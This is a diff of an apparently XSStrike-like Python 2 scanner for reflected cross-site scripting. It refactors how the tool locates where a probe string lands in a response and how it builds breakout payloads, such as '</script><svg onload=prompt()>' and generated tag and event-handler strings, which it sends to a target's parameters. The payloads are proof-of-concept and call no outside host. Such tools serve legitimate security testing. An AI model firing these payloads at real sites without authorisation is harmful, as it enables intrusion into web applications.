@@ -1,16 +1,16 @@
 #!/usr/bin/env python2
-from urlparse import urlparse, parse_qs # library to parse urls and perform operations
+
+import re # Module for RegEx
 import sys # Standars system library
+import os # Standard module for system related operations
 import webbrowser # To open pages in "real" browers
 import mechanize # To make request to webpages
+from urlparse import urlparse, parse_qs # library to parse urls and perform operations
 from itertools import izip # To iterate over multiple lists simultaneously
 from urllib import quote_plus # To encode payloads
 from prettytable import PrettyTable # Module for print table of results
 from fuzzywuzzy import fuzz # Module for fuzzy matching
-from HTMLParser import HTMLParser # For parsing HTML
 from time import sleep # To pause the program for a specific time
-import re # Module for RegEx
-import os # Standard module for system related operations
 
 # Just some colors and shit
 white = '\033[1;97m'
@@ -32,7 +32,7 @@ br.set_handle_referer(True) # Include referrer
 br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
 ('Accept-Encoding', 'deflate'), ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')]
 
-date = '08-05-2018'
+date = '08.1-05-2018'
 
 def update():
     print '%s Checking for updates...' % run
@@ -45,12 +45,6 @@ def update():
 xsschecker = 'd3v' # A non malicious string to check for reflections and stuff
 paranames = [] # list for storing parameter names
 paravalues = [] # list for storing parameter values 
-
-CURRENTLY_OPEN_TAGS = [] # Used by HTML parser
-OPEN_EMPTY_TAG = "" # to store context i.e. <input attr=$reflection> then input will be open tag
-
-blacklist = ['html','body','br'] # These tags are normally empty thats why we are ignoring them
-whitelist = ['input', 'textarea'] # These tags are the top priority to break out from        
 
 NUM_REFLECTIONS = 0 # Number of reflections
 OCCURENCE_NUM = 0 # Occurence number
@@ -251,47 +245,34 @@ def filter_checker(url, param_data, GET, POST):
 #   Locater
 ##################
 
+def html_parser(response):
+    parts = response.split(xsschecker)
+    parts.remove(parts[0])
+    parts = [xsschecker + s for s in parts]
+    number = 0
+    for part in parts:
+        number = number + 1
+        deep = part.split('>')
+        if '</script' in deep[0]:
+            location = 'script'
+        elif '</' in deep[0]:
+            location = 'html'
+        elif deep[0][:2] == '--':
+            location = 'comment'
+        else:
+            location = 'attribute'
+        occur_location.append(location)
+        occur_number.append(number)
+
 def locater(url, param_data, GET, POST):
-    init_resp = make_request(url, param_data, GET, POST) # Makes request to the target
-    if(xsschecker in init_resp.lower()): # if the xsschecker is found in the response
+    response = make_request(url, param_data, GET, POST) # Makes request to the target
+    if(xsschecker in response.lower()): # if the xsschecker is found in the response
         global NUM_REFLECTIONS # The number of reflections of xsschecker in the response
-        NUM_REFLECTIONS = init_resp.lower().count(xsschecker.lower()) # Counts number of time d3v got reflected in webpage
+        NUM_REFLECTIONS = response.lower().count(xsschecker.lower()) # Counts number of time d3v got reflected in webpage
         print '%s Number of reflections found: %i' % (info, NUM_REFLECTIONS)
-        for i in range(NUM_REFLECTIONS):
-            global OCCURENCE_NUM
-            OCCURENCE_NUM = i+1
-            scan_occurence(init_resp) # Calls out a function to find context/location of xsschecker 
-            # Reset globals for next instance
-            global ALLOWED_CHARS, IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG, CURRENTLY_OPEN_TAGS, OPEN_TAGS, OCCURENCE_PARSED, OPEN_EMPTY_TAG
-            ALLOWED_CHARS, CURRENTLY_OPEN_TAGS, OPEN_TAGS = [], [], []
-            IN_SINGLE_QUOTES, IN_DOUBLE_QUOTES, IN_TAG_ATTRIBUTE, IN_TAG_NON_ATTRIBUTE, IN_SCRIPT_TAG = False, False, False, False, False
-            OCCURENCE_PARSED = 0
-            OPEN_EMPTY_TAG = ""
+        html_parser(response)
     else: #Launched hulk if no reflection is found. Hulk Smash!
         print '%s No reflection found.' % bad
-
-def scan_occurence(init_resp):
-    # Parses the response to locate the position/context of xsschecker i.e. d3v
-    location = html_parse(init_resp) # Calling out the parser function
-    if location in ('script', 'html_data', 'start_end_tag_attr', 'attr'):
-        occur_number.append(OCCURENCE_NUM)
-        occur_location.append(location)
-    # We are treating the comment context differentally because if a payload is reflected
-    # in comment, it won't execute. So will we test the comment context first
-    elif location == 'comment':
-        occur_number.insert(0, OCCURENCE_NUM) # inserting the occurence_num in start of the list
-        occur_location.insert(0, location) # same as above
-    else:
-        pass
-
-def html_parse(init_resp):
-    parser = MyHTMLParser() # initializes the parser
-    location = '' # Variable for containing the location lol
-    try:
-        parser.feed(init_resp) # submitting the response to the parser
-    except Exception as e: # Catching the exception/error
-        location = str(e) # The error is actually the location. For more info, check MyHTMLParser class
-    return location # Returns the location
 
 def test_param_check(payload_to_check, payload_to_compare, OCCURENCE_NUM, url, param_data, GET, POST, action):
     check_string = 'XSSSTART' + payload_to_check + 'XSSEND' # We are adding XSSSTART and XSSEND to make
@@ -330,14 +311,12 @@ def test_param_check(payload_to_check, payload_to_compare, OCCURENCE_NUM, url, p
                     data_type = occur_location[OCCURENCE_NUM - 1]
                     if data_type == 'comment':
                         location_readable = 'inside a HTML comment '
-                    elif data_type == 'html_data':
+                    elif data_type == 'html':
                         location_readable = 'as data or plaintext on the page'
                     elif data_type == 'script':
                         location_readable = 'as data in javascript'
-                    elif data_type == 'start_end_tag_attr':
-                        location_readable = 'as an attribute in an empty tag'
-                    elif data_type == 'attr':
-                        location_readable = 'as an attribute in an HTML tag'
+                    elif data_type == 'attribute':
+                        location_readable = 'as an attribute in a HTML tag'
                     print '%s Location: %s' % (good, location_readable)
                     break
                 except:
@@ -356,60 +335,6 @@ def make_request(url, param_data, GET, POST): #The main function which actually 
     except:
         print '\n%s Target isn\'t responding.' % bad
         quit()
-        
-class MyHTMLParser(HTMLParser):
-    def handle_comment(self, data):
-        global OCCURENCE_PARSED
-        if(xsschecker.lower() in data.lower()):
-            OCCURENCE_PARSED += 1
-            if(OCCURENCE_PARSED == OCCURENCE_NUM):
-                raise Exception("comment")
-    
-    def handle_startendtag(self, tag, attrs):
-        global OCCURENCE_PARSED
-        global OCCURENCE_NUM
-        global OPEN_EMPTY_TAG
-        if (xsschecker.lower() in str(attrs).lower()):
-            OCCURENCE_PARSED += 1
-            if(OCCURENCE_PARSED == OCCURENCE_NUM):
-                OPEN_EMPTY_TAG = tag
-                raise Exception("start_end_tag_attr")
-            
-    def handle_starttag(self, tag, attrs):
-        global CURRENTLY_OPEN_TAGS
-        global OPEN_TAGS
-        global OCCURENCE_PARSED
-        if(tag not in blacklist):
-            CURRENTLY_OPEN_TAGS.append(tag)
-        if (xsschecker.lower() in str(attrs).lower()):
-            if(tag == "script"):
-                OCCURENCE_PARSED += 1
-                if(OCCURENCE_PARSED == OCCURENCE_NUM):
-                    raise Exception("script")
-            else:
-                OCCURENCE_PARSED += 1
-                if(OCCURENCE_PARSED == OCCURENCE_NUM):
-                    raise Exception("attr")
-
-    def handle_endtag(self, tag):
-        global CURRENTLY_OPEN_TAGS
-        global OPEN_TAGS
-        global OCCURENCE_PARSED
-        if(tag not in blacklist):
-            CURRENTLY_OPEN_TAGS.remove(tag)
-            
-    def handle_data(self, data):
-        global OCCURENCE_PARSED
-        if (xsschecker.lower() in data.lower()):
-            OCCURENCE_PARSED += 1
-            if(OCCURENCE_PARSED == OCCURENCE_NUM):
-                try:
-                    if(CURRENTLY_OPEN_TAGS[len(CURRENTLY_OPEN_TAGS)-1] == "script"):
-                        raise Exception("script")
-                    else:
-                        raise Exception("html_data")
-                except:
-                    raise Exception("html_data")
 
 #################
 #   Which Quote
@@ -532,8 +457,9 @@ def inject(url, param_data, GET, POST):
             print ''
         elif location == 'script':
             print '%s Trying to break out of %sJavaScript%s context.' % (run, green, end)
-            prefixes = ['\'-', '\\\'-', '\\\'-']
-            suffixes = ['-\'', '-\\\'', '//\'']
+            quote = which_quote(OCCURENCE_NUM, url, param_data, GET, POST)
+            prefixes = ['%s-' % quote, '\\%s-' % quote, '\\%s-' % quote]
+            suffixes = ['-%s' % quote, '-\\%s' % quote, '//%s' % quote]
             progress = 0
             for prefix, suffix in izip(prefixes, suffixes):
                 for function in functions:
@@ -544,7 +470,7 @@ def inject(url, param_data, GET, POST):
                     test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
             test_param_check(quote_plus('</script><svg onload=prompt()>'), '</script><svg onload=prompt()>', OCCURENCE_NUM, url, param_data, GET, POST, action='do')
         
-        elif location == 'html_data':
+        elif location == 'html':
             print '%s Trying to break out of %sPlaintext%s context.' % (run, green, end)
             progress = 0
             l_than, g_than = '', ''
@@ -570,7 +496,7 @@ def inject(url, param_data, GET, POST):
                                 payload = '%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
                             test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, GET, POST, action='do')
 
-        elif location == 'start_end_tag_attr' or location == 'attr':
+        elif location == 'attribute':
             print '%s Trying to break out of %sAttribute%s context.' % (run, green, end)
             quote = which_quote(OCCURENCE_NUM, url, param_data, GET, POST)
             
